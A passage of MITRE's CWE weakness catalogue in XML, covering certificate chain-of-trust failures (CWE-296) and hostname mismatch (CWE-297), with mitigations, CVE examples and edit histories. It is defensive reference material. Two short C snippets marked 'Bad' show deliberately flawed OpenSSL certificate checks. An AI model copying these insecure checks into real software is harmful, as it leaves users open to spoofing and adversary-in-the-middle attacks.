               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0265</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-1229</Reference>
               <Description>chain: product checks if client is trusted when it intended to check if the server is trusted, allowing validation of signed code.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-1229</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0862</Reference>
               <Description>Cryptographic API, as used in web browsers, mail clients, and other software, does not properly validate Basic Constraints.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0862</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1358</Reference>
               <Description>chain: OS package manager does not check properly check the return value, allowing bypass using a revoked certificate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1358</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Insecure Configuration Management</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="459"/>
            <Related_Attack_Pattern CAPEC_ID="475"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-243"/>
            <Reference External_Reference_ID="REF-244"/>
         </References>
         <Content_History>
            <Submission>
                <Submission_Name>CWE Community</Submission_Name>
                <Submission_Date>2006-07-19</Submission_Date>
				<Submission_Comment>Submitted by members of the CWE community to extend early CWE versions</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Background_Details, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-12-28</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Converted from category to weakness class.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Time_of_Introduction, Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Background_Details, Modes_of_Introduction, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Observed_Examples, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Modes_of_Introduction</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2013-02-21">Certificate Issues</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="296" Name="Improper Following of a Certificate's Chain of Trust" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate.</Description>
         <Extended_Description>
            <xhtml:p>If a system does not follow the chain of trust of a certificate to a root server, the certificate loses all usefulness as a metric of trust. Essentially, the trust gained from a certificate is derived from a chain of trust -- with a reputable trusted entity at the end of that list. The end user must trust that reputable source, and this reputable source must vouch for the resource in question through the medium of the certificate.</xhtml:p>
            <xhtml:p>In some cases, this trust traverses several entities who vouch for one another. The entity trusted by the end user is at one end of this trust chain, while the certificate-wielding resource is at the other end of the chain. If the user receives a certificate at the end of one of these trust chains and then proceeds to check only that the first link in the chain, no real trust has been derived, since the entire chain must be traversed back to a trusted source to verify the certificate.</xhtml:p>
            <xhtml:p>There are several ways in which the chain of trust might be broken, including but not limited to:</xhtml:p>
            <xhtml:ul>
              <xhtml:li>Any certificate in the chain is self-signed, unless it the root.</xhtml:li>
              <xhtml:li>Not every intermediate certificate is checked, starting from the original certificate all the way up to the root certificate.</xhtml:li>
              <xhtml:li>An intermediate, CA-signed certificate does not have the expected Basic Constraints or other important extensions.</xhtml:li>
              <xhtml:li>The root certificate has been compromised or authorized to the wrong party.</xhtml:li>
            </xhtml:ul>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="295" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="573" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>When the product uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>Exploitation of this flaw can lead to the trust of data that may have originated with a spoofed source.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>Data, requests, or actions taken by the attacking entity can be carried out as a spoofed benign entity.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that proper certificate checking is included in the system design.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Understand, and properly implement all checks necessary to ensure the integrity of certificate trust integrity.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the full chain of trust.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-121">
               <Intro_Text>This code checks the certificate of a connected peer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>if ((cert = SSL_get_peer_certificate(ssl)) &amp;&amp; host)<xhtml:div style="margin-left:1em;">foo=SSL_get_verify_result(ssl);</xhtml:div>
                     <xhtml:br/>if ((X509_V_OK==foo) || X509_V_ERR_SELF_SIGNED_CERT_IN_CHAIN==foo))<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// certificate looks good, host can be trusted</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>In this case, because the certificate is self-signed, there was no external authority that could prove the identity of the host. The program could be communicating with a different system that is spoofing the host, e.g. by poisoning the DNS cache or using an Adversary-in-the-Middle (AITM) attack to modify the traffic from server to client.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2016-2402</Reference>
               <Description>Server allows bypass of certificate pinning by sending a chain of trust that includes a trusted CA that is not pinned.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2016-2402</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4989</Reference>
               <Description>Verification function trusts certificate chains in which the last certificate is self-signed.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4989</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5821</Reference>
               <Description>Chain: Web browser uses a TLS-related function incorrectly, preventing it from verifying that a server's certificate is signed by a trusted certification authority (CA).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5821</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3046</Reference>
               <Description>Web browser does not check if any intermediate certificates are revoked.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3046</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0265</Reference>
               <Description>chain: DNS server does not correctly check return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0265</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0124</Reference>
               <Description>chain: incorrect check of return value from the OpenSSL EVP_VerifyFinal function allows bypass of validation of the certificate chain.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0124</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0970</Reference>
               <Description>File-transfer software does not validate Basic Constraints of an intermediate CA-signed certificate.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0970</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0862</Reference>
               <Description>Cryptographic API, as used in web browsers, mail clients, and other software, does not properly validate Basic Constraints.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0862</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Failure to follow chain of trust in certificate validation</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-245"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 23: Improper Use of PKI, Especially SSL.&#34; Page 347"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Name, Observed_Examples, Other_Notes, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Observed_Examples, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Modes_of_Introduction</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-03-10">Failure to Follow Chain of Trust in Certificate Validation</Previous_Entry_Name>
            <Previous_Entry_Name Date="2013-02-21">Improper Following of Chain of Trust for Certificate Validation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="297" Name="Improper Validation of Certificate with Host Mismatch" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product communicates with a host that provides a certificate, but the product does not properly ensure that the certificate is actually associated with that host.</Description>
         <Extended_Description>
            <xhtml:p>Even if a certificate is well-formed, signed, and follows the chain of trust, it may simply be a valid certificate for a different site than the site that the product is interacting with. If the certificate's host-specific data is not properly checked - such as the Common Name (CN) in the Subject or the Subject Alternative Name (SAN) extension of an X.509 certificate - it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data, impersonating a trusted host. In order to ensure data integrity, the certificate must be valid and it must pertain to the site that is being accessed.</xhtml:p>
            <xhtml:p>Even if the product attempts to check the hostname, it is still possible to incorrectly check the hostname. For example, attackers could create a certificate with a name that begins with a trusted name followed by a NUL byte, which could cause some string-based comparisons to only examine the portion that contains the trusted name.</xhtml:p>
            <xhtml:p>This weakness can occur even when the product uses Certificate Pinning, if the product does not verify the hostname at the time a certificate is pinned.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="923" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="295" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
            <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>When the product uses certificate pinning, the developer might not properly validate all relevant components of the certificate before pinning the certificate. This can make it difficult or expensive to test after the pinning is complete.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>The data read from the system vouched for by the certificate may not be from the expected system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Authentication</Scope>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Trust afforded to the system in question - based on the malicious certificate - may allow for spoofing or redirection attacks.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>Set up an untrusted endpoint (e.g. a server) with which the product will connect.  Create a test certificate that uses an invalid hostname but is signed by a trusted CA and provide this certificate from the untrusted endpoint. If the product performs any operations instead of disconnecting and reporting an error, then this indicates that the hostname is not being checked and the test certificate has been accepted.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>When Certificate Pinning is being used in a mobile application, consider using a tool such as Spinner [REF-955].  This methodology might be extensible to other technologies.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Fully check the hostname of the certificate and provide the user with adequate information about the nature of the problem and how to proceed.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the hostname.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-122">
               <Intro_Text>The following OpenSSL code obtains a certificate and verifies it.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>cert = SSL_get_peer_certificate(ssl);<xhtml:br/>if (cert &amp;&amp; (SSL_get_verify_result(ssl)==X509_V_OK)) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>
                           <xhtml:i>// do secret things</xhtml:i>
                           <xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Even though the "verify" step returns X509_V_OK, this step does not include checking the Common Name against the name of the host. That is, there is no guarantee that the certificate is for the desired host. The SSL connection could have been established with a malicious host that provided a valid certificate.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2012-5810</Reference>
               <Description>Mobile banking application does not verify hostname, leading to financial loss.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5810</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5811</Reference>
               <Description>Mobile application for printing documents does not verify hostname, allowing attackers to read sensitive documents.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5811</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5807</Reference>
               <Description>Software for electronic checking does not verify hostname, leading to financial loss.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5807</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-3446</Reference>
               <Description>Cloud-support library written in Python uses incorrect regular expression when matching hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-3446</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2408</Reference>
               <Description>Web browser does not correctly handle '\0' character (NUL) in Common Name, allowing spoofing of https sites.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2408</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-0867</Reference>
               <Description>Database program truncates the Common Name during hostname verification, allowing spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-0867</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2074</Reference>
               <Description>Incorrect handling of '\0' character (NUL) in hostname verification allows spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2010-2074</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4565</Reference>
               <Description>Mail server's incorrect handling of '\0' character (NUL) in hostname verification allows spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-4565</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3767</Reference>
               <Description>LDAP server's incorrect handling of '\0' character (NUL) in hostname verification allows spoofing.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3767</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5806</Reference>
               <Description>Payment processing module does not verify hostname when connecting to PayPal using PHP fsockopen function.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5806</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-2993</Reference>
               <Description>Smartphone device does not verify hostname, allowing spoofing of mail services.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-2993</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5804</Reference>
               <Description>E-commerce module does not verify hostname when connecting to payment site.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5804</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5824</Reference>
               <Description>Chat application does not validate hostname, leading to loss of privacy.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5824</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5822</Reference>
               <Description>Application uses third-party library that does not validate hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5822</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5819</Reference>
               <Description>Cloud storage management application does not validate hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5819</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5817</Reference>
               <Description>Java library uses JSSE SSLSocket and SSLEngine classes, which do not verify the hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5817</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5784</Reference>
               <Description>SOAP platform does not verify the hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5784</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5782</Reference>
               <Description>PHP library for payments does not verify the hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5782</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2012-5780</Reference>
               <Description>Merchant SDK for payments does not verify the hostname.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2012-5780</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0355</Reference>
               <Description>Web browser does not validate Common Name, allowing spoofing of https sites.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0355</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Failure to validate host-specific certificate data</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-245"/>
            <Reference External_Reference_ID="REF-243"/>
            <Reference External_Reference_ID="REF-249"/>
            <Reference External_Reference_ID="REF-250"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 23: Improper Use of PKI, Especially SSL.&#34; Page 347"/>
            <Reference External_Reference_ID="REF-955"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
